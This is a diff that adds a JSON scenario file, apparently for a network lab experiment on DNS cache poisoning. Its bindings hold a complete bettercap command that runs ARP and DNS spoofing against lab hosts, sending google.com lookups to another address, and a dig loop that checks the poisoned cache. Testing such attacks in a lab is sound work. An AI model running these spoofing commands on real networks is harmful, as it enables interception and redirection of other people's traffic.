@@ -1,0 +1,13 @@
+{
+  "Scenario": {
+    "task1": "attacker spoof startemit spoofing",
+    "task2": "when spoofing wait 12 cache flushcache emit flushed",
+    "task3": "when flushed client digcache"
+  },
+  "Bindings": {
+    "spoof": "bash -c \"sudo timeout 80 docker run --rm --privileged --net=host bettercap/bettercap -iface $expeth(auth) -eval 'set arp.spoof.targets 10.1.2.2,10.1.2.3; set arp.spoof.fullduplex true; set dns.spoof.domains *.google.com,google.com; set dns.spoof.address 10.1.2.4; set dns.spoof.all true; arp.spoof on; dns.spoof on' > /tmp/bettercap.txt 2>&1; true\"",
+    "flushcache": "bash -c \"sudo rndc flush; echo done\"",
+    "digcache": "bash -c \"for i in 1 2 3 4; do echo try$i: $(dig @10.1.2.2 www.google.com A +short); sleep 4; done > /tmp/dig-spoof2.txt 2>&1\""
+  },
+  "Constraints": {}
+}
